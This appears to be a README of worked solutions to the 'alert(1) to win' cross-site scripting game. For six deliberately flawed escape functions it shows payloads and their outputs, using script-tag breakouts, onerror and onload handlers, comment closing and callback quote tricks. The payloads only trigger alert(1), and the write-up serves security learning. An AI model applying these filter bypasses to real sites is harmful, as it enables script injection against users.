# alert-1-to-win
Exercises of alert(1) to win with payloads and procedure 
***Exercise 1. WARMUP - There isn't sanitization

	function escape(s) {
 	 return '<script>console.log("'+s+'");</script>';
	}

	First tests
		Input  	test
		Output 	<script>console.log("test");</script>

	We have to close console.log with ")

	All this payload Works

	Input  	")</script><script>alert(1)</script>
	Output 	<script>console.log("")</script><script>alert(1)</script>");</script>

	Input		")</script><script>alert(1)//
	Output		<script>console.log("")</script><script>alert(1)//");</script>

	Input		");</script><script>alert(1)//
	Output		<script>console.log("");</script><script>alert(1)//");</script>

	We can reduce the payload

	Input		");alert(1)//
	Output		<script>console.log("");alert(1)//");</script>
	
	Input		",alert(1),"
	Output		<script>console.log("",alert(1),"");</script>
	
	Input		");alert(1,"
	Output		<script>console.log("");alert(1,"");</script>
	
	
***Exercise 2. ADOBE - Where " is encoded to \"	
	
	function escape(s) {
  	 s = s.replace(/"/g, '\\"');
 	 return '<script>console.log("' + s + '");</script>';
	}

	We have to close console.log with ")

	All this payload Works

	Input		")</script><script>alert(1)//	
	Output		<script>console.log("\")</script><script>alert(1)//");</script>

	Input		")</script><script>alert(1)</script>
	Output		<script>console.log("\")</script><script>alert(1)</script>");</script>
	
	Input		")</script><script>alert(1);//
	Output		<script>console.log("\")</script><script>alert(1);//");</script>

	We can reduce the payload

	Input		\");alert(1)//
	Output		<script>console.log("\\");alert(1)//");</script>

	

***Exercise 3. JSON- Where " is encoded to \"
	function escape(s) {
  	   s = JSON.stringify(s);
  	   return '<script>console.log(' + s + ');</script>';
	}
	
	https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify

	The JSON.stringify() method converts a JavaScript object or value to a JSON string, optionally replacing values if a replacer function is specified or optionally including only the specified properties if a replacer array is specified.

	JSON.stringify escapes double quotes " and the escape character \ , but does not handle < > ' / characters.

	All this payload Works

	Input		</script><script>alert(1)</script>
	Output		<script>console.log("</script><script>alert(1)</script>");</script>

	Input		</script><script>alert(1)//
	Output		<script>console.log("</script><script>alert(1)//");</script>

	Input		")</script><script>alert(1)//
	Output		<script>console.log("\")</script><script>alert(1)//");</script>

***Exercise 4. MARKDOWN- where " encode to &quot; and < encode to &lt;

	function escape(s) {
	  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
	  // URLs
	  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
	  // [[img123|Description]]
	  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
	  return text;
	}

	In the first text.replace relates an http so that it is transformed into an image
	In the second text.replace we can see  (/\[\[(\w+)\|(.+?)\]\]/g that is [[|]]
	We have to use [[a|b]]
	We have to put a url in [[a|b]]
	
	First tests 

	Input 		http://test
	Output		<a href="http://test">http://test</a>

	Input		[[a|b]]	
	Output		<img alt="b" src="a.gif">
	
	Input 		[[http://test|b]]
	Output 	[[<a href="http://test|b]]">http://test|b]]</a>

	Input 		[[a|http://test]]
	Output		<img alt="<a href="http://test" src="a.gif">">http://test]]</a>

	Input 		[[a|http://onerror=alert(1)]]
	Output 	<img alt="<a href="http://onerror=alert(1)" src="a.gif">">http://onerror=alert(1)]]</a>

	We have to add // 
	This payload work

	Input		 [[a|http://onerror=alert(1)//]]
	Output Win	 <img alt="<a href="http://onerror=alert(1)//" src="a.gif">" http://onerror=alert(1)//]]</a>


***Exercise 5. DOM- We have to use ' Pass in something like "TextNode#foo" '

	function escape(s) {
	  // Slightly too lazy to make two input fields.
	  // Pass in something like "TextNode#foo"
	  var m = s.split(/#/);

	  // Only slightly contrived at this point.
	  var a = document.createElement('div');
	  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
	  return a.innerHTML;
	}

	First tests 

	Input		TextNode#foo
	Output 	foo

	Input		TextNode#Hi
	Output 	Hi

	We have to change TextNode to Comment

	Input		Comment#Hi
	Output		<!--Hi-->

	Now we have to add -->

	Input 		Comment#-->
	Output 	<!---->-->

	Nice, Now we have to add a payload
	All this payload Works

	Input		Comment#--><script>alert(1)</script>//
	Output	 Win!	<!----><script>alert(1)</script>//-->

	Input		Comment#--><img/onerror=alert(1) src=x/>
	Output	 Win! 	<!----><img/onerror=alert(1) src=x/>-->

	Input		Comment#><iframe/onload=alert(1)
	Output Win!	<!--><iframe/onload=alert(1)-->


***Exercise 6. CALLBACK

	function escape(s) {
	  // Pass inn "callback#userdata"
	  var thing = s.split(/#/); 

	 if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
	  var obj = {'userdata': thing[1] };
	  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
	  return "<script>" + thing[0] + "(" + json +")</script>";
	}

	thing[0], can use []' in addition to the alphabet. It is possible to enclose unnecessary parts in single quotes and write arbitrary scripts in succession.
	 var thing = s.split(/#/);  split the function

	First tests

	Input		aaaa#bbbb
	Output		<script>aaaa({"userdata":"bbbb"})</script>
	
	' | ; are not encoded

	Input 		'#'alert(1)//
	Output		<script>'({"userdata":"'alert(1)//"})</script>

	All this payload Works

	Input 		'#'|alert(1)//
	Output	 Win!  <script>'({"userdata":"'|alert(1)//"})</script>


	Input		'#';alert(1)//
	Output	 Win!	<script>'({"userdata":"';alert(1)//"})</script>
